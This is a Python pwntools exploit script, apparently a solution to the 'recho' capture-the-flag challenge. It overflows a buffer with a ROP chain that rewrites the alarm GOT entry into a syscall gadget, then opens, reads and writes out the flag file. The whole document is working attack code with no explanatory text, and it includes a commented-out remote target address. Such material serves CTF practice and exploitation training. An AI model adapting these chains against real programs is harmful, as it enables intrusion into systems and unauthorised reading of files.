#coding:utf-8
from pwn import *
#  context.log_level = 'debug'
 
io = process('./recho')
# io = remote('111.198.29.45','52133')
 
elf = ELF('./recho')
 
 
pop_rax=0x00000000004006fc
pop_rdi=0x00000000004008a3
pop_rdx=0x00000000004006fe
rsi_r15_ret = 0x4008a1
add_rdi_al=0x000000000040070d
flag_addr=0x601058
alarm_got = elf.got['alarm']
read_plt = elf.plt['read']
write_plt = elf.plt['write']
alarm_plt = elf.plt['alarm']
free_addr=0x601090
#rdi，rsi，rdx，r10，r9，r8
#fd=open("flag")
#read(fd, bss_addr, 100)
#write(1, bss_addr, 100)
payload=""
payload+='a'*0x38
payload+=p64(pop_rax)+p64(0x5)
payload+=p64(pop_rdi)+p64(alarm_got)
payload+=p64(add_rdi_al)

payload+=p64(pop_rax)+p64(0x2)
payload+=p64(pop_rdi)+p64(flag_addr)
payload+=p64(pop_rdx)+p64(0)
payload+=p64(rsi_r15_ret)+p64(0)*2
payload+=p64(alarm_plt)               # syscall 2 -> open flag

payload+=p64(pop_rdi)+p64(0x3)
payload+=p64(rsi_r15_ret)+p64(free_addr)+p64(0)
payload+=p64(pop_rdx)+p64(0x30)
payload+=p64(read_plt)                # read flag from open fd(3) to bss


payload+=p64(pop_rdi)+p64(0x1)
payload+=p64(rsi_r15_ret)+p64(free_addr)+p64(0)
payload+=p64(pop_rdx)+p64(0x30)
payload+=p64(write_plt)               # write flag from bss to screen


io.sendline(str(0x200))
io.sendline(payload.ljust(0x200, '\x00'))
io.recv()
io.shutdown("send")
io.interactive()
io.close()